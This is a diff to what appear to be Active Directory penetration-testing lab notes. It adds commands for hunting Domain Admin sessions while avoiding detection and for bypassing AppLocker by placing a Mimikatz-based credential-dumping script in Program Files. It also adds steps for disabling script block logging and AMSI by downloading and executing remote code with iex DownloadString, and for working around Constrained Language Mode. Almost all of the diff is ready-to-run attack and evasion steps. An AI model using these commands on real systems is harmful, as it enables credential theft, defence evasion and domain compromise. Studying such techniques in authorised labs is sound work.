@@ -235,15 +235,27 @@ Analysis Queries:
 
 #### Session Enumeration
 ```powershell
-# Find user sessions on remote machines
+# Find user sessions on remote machines (entire domain scan)
 Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
 
-# Specific target list
+# Specific target list (OPSEC friendly - faster, less detection)
 Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\servers.txt | 
   select Hostname,UserSession,Access
 
 # Look for: Domain Admins or Service Accounts on accessible machines
+
+# Example server list format (C:\servers.txt):
+# DCORP-ADMINSRV
+# DCORP-APPSRV
+# DCORP-CI
+# DCORP-MGMT
+# DCORP-MSSQL
 ```
+
+**Key Indicators:**
+- `Access: True` = Current user has admin access on machine
+- Service account sessions on admin-accessible machines = credential extraction opportunity
+- DA sessions = privilege escalation target
 
 #### Domain User Location
 ```powershell
@@ -729,49 +741,83 @@ Achieve Domain Admin
 
 ---
 
-### Path 3: Applock Bypass via Program Files Default Rule
+### Path 3: Applocker Bypass via Program Files Default Rule
 
 #### Applocker Rule Identification
+
+**Step 1: Query Registry for Applocker Configuration**
+```cmd
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+
+# Output shows configured rule types:
+# - Appx (Windows Store apps)
+# - Dll (Dynamic link libraries)
+# - Exe (Executables)
+# - Msi (Windows installer packages)
+# - Script (PowerShell scripts)
+```
+
+**Step 2: Enumerate Script Rules**
 ```cmd
 reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script
 
-# Output shows rules for:
-# - %PROGRAMFILES%\* (Everyone allowed)
-# - %WINDIR%\* (Everyone allowed)
-# - Scripts from specific path
+# Output: List of GUID-based rules
+# Look for: Rules with %PROGRAMFILES%\* and %WINDIR%\* paths
+```
+
+**Step 3: Inspect Specific Rule**
+```cmd
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\{GUID}
+
+# Output example:
+# REG_SZ "(Default Rule) All scripts located in the Program Files folder"
+# Path: %PROGRAMFILES%\*
+# Action: Allow
+# UserOrGroupSid: S-1-1-0 (Everyone)
+```
+
+**PowerShell Alternative:**
+```powershell
+# From PSRemoting session on protected machine:
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# Shows Path conditions and whether Everyone has Allow action
 ```
 
 #### Exploitation Steps
+
+**Option A: Via WinRS (Remote Command)**
 ```powershell
-# 1. Verify rule content
-winrs -r:dcorp-adminsrv 
-  "reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\{GUID}"
+# 1. Copy CLM-compatible script to Program Files
+Copy-Item Invoke-TheKatEx-keys.ps1 
+  \\dcorp-adminsrv\c$\'Program Files'
+
+# 2. Execute via winrs (WinRM)
+winrs -r:dcorp-adminsrv "powershell -c C:\Program Files\Invoke-TheKatEx-keys.ps1"
+
+# Result: Script executes, bypasses Applocker default rule allows Program Files
+```
+
+**Option B: Via PSRemoting (Interactive)**
+```powershell
+# 1. Connect to remote machine (will enter CLM)
+Enter-PSSession -ComputerName dcorp-adminsrv
 
 # 2. Copy script to Program Files
-Copy-Item Invoke-Mimi.ps1 
-  \\dcorp-adminsrv.domain.com\c$\'Program Files'
+Copy-Item C:\source\Invoke-TheKatEx-keys.ps1 'C:\Program Files'
 
-# 3. Execute (bypasses Applocker)
-winrs -r:dcorp-adminsrv 
-  "powershell -c C:\Program Files\Invoke-Mimi.ps1"
+# 3. Execute from Program Files
+CD 'C:\Program Files'
+.\Invoke-TheKatEx-keys.ps1
 
-# Key: Script must NOT use dot-sourcing (. .\script.ps1)
-# Function call must be included in script directly
+# Result: CLM-compatible script runs despite Constrained Language Mode
 ```
 
-#### Modification of CLM-Constrained Script
-```powershell
-# In Constrained Language Mode, cannot use dot-sourcing
-# Solution: Include function call in script itself
-
-# Original (doesn't work in CLM):
-# . .\Invoke-Mimikatz.ps1
-# Invoke-Mimikatz -Command "sekurlsa::evasive-keys"
-
-# Modified for CLM (works):
-# [Script contains function definition]
-# Invoke-Mimikatz -Command "sekurlsa::evasive-keys"  # Direct call at end
-```
+**Key Requirements:**
+- Script must be copied to C:\Program Files\ (Applocker default allows this)
+- Script must NOT use dot-sourcing (. .\script.ps1) - CLM blocks this
+- Script must contain complete function definition + direct function call at end
+- No external dependencies or module imports
 
 ---
 
@@ -1620,17 +1666,53 @@ Codecepticon.exe --action obfuscate --module powershell
 
 ### AMSI & Logging Bypass
 
+**Use Case:** Bypass defenses when running PowerShell tools (PowerView, Mimikatz scripts) in reverse shells or remote sessions.
+
 #### Script Block Logging Bypass
 ```powershell
 # Disable Enhanced Script Block Logging at runtime
 iex (New-Object System.NET.WebClient).DownloadString('http://server/sbloggingbypass.txt')
+
+# This must run BEFORE any tool execution to avoid detection of tool import
 ```
 
 #### AMSI Bypass
 ```powershell
-# Runtime AMSI bypass
+# Runtime AMSI bypass (must run AFTER Script Block Logging bypass)
 iex (New-Object System.NET.WebClient).DownloadString('http://server/Amsi-Byp.txt')
+
+# Enables running of sensitive tools without AMSI detection
 ```
+
+#### Constrained Language Mode (CLM) Bypass for Applocker-Protected Machines
+
+**Problem:** PSRemoting into Applocker-protected machines drops to Constrained Language Mode, preventing:
+- Dot-sourcing (. .\script.ps1)
+- Dynamic code execution
+- Module loading
+
+**Solution:** Embed function call directly in script
+
+```powershell
+# Original (FAILS in CLM):
+# . .\Invoke-Mimikatz.ps1
+# Invoke-Mimikatz -Command "sekurlsa::evasive-keys"
+
+# Modified for CLM (WORKS):
+# Copy entire Invoke-Mimikatz function definition into script
+# Add direct function call at END of script file:
+Invoke-Mimikatz -Command "sekurlsa::evasive-keys"
+
+# Create as: Invoke-TheKatEx-keys.ps1
+# Copy to: C:\Program Files\Invoke-TheKatEx-keys.ps1 (bypasses Applocker)
+# Run from PSRemoting session: .\Invoke-TheKatEx-keys.ps1
+```
+
+**Why This Works:**
+- Applocker default rule: Everyone allowed to run scripts in %PROGRAMFILES%\*
+- No dot-sourcing = No dot-sourcing detection by CLM
+- Function embedded in file = No external dot-sourcing dependency
+- Direct invocation at script end = Executes without CLM restrictions
 
 ### Lateral Movement Evasion
 
